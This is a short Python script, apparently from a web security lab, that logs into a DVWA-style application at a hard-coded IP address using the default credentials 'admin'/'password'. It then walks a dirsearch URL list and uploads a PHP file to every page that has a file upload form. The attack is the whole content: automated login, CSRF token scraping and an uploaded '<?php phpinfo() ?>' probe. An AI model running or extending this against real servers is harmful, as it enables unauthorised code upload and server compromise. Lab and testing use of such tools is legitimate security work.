from bs4 import BeautifulSoup as bs
import requests

def getCookie(address):
    with requests.Session() as session:
        html = session.get('http://45.147.96.25:4242/login.php')
        html_parsed = bs(html.text, "html.parser")
        user_token = html_parsed.find('input', { "type" : "hidden" })['value']
        creds = {
            "username"   : 'admin',
            "password"   : 'password',
            "Login"      : "Submit",
            "user_token" : user_token
        }
        request = session.post('http://45.147.96.25:4242/login.php', data = creds)
        cookie = html.cookies.get_dict()
        soup = bs(session.get(address).content, "html.parser")
        input = soup.find_all('input',type = "file")
        session.close()
    return cookie,input

def fileUpload():
    f = open('dirsearch_output_test.txt', 'r')
    file_contents = f.readlines()

    uploadableForm = []
    report = []
    report.append("Starting automated file upload scan:")

    print("Starting automated file upload scan:")

    for count, line in enumerate(file_contents, start=1):
        address = line[13:].split(' ')[0].strip()
        print('Searching for form in ' + address + '... [' + str(count) + '/' + str(len(file_contents)) + ']')

        if address.endswith(".ini") or address.endswith(".txt") or "/." in address:
            #report.append(address + " can't be the subject of file upload")
            print(address + " can't be the subject of file upload")
        else:
            cookie = getCookie(address)[0]
            if(getCookie(address)[1]!=[]):
                request = requests.post(address,cookies=cookie,files={'MAX_FILE_SIZE': (None, '100000'),'uploaded':('file.php','<?php phpinfo() ?>') ,'Upload': (None, 'Upload')})
                if(request.ok):
                    report.append(address + " is vulnerable to file upload!")
                    report.append("The file has been uploaded")
                    print("The file has been upload")
                else:
                    print("upload fail")
            else:
                #report.append(address+" is not vulnerable to file upload!")
                print("No upload input here")
    return report